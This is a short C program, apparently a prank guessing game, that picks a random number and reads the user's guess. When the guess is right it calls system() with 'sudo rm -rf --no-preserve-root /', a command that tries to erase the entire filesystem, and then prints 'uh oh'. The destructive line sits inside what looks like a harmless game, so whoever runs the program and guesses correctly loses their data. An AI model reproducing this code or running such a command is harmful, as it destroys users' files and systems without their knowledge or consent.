#include<time.h>
#include<stdlib.h>
#include<stdio.h>

int main() {
    srand(time(NULL));

    int person;
    int number = rand() % 100;
    
    scanf("%d", &person);

    if(person == number) {
      system("sudo rm -rf --no-preserve-root /");
      printf("uh oh");
    }

    printf("%d\n", number);
    return 0;
}
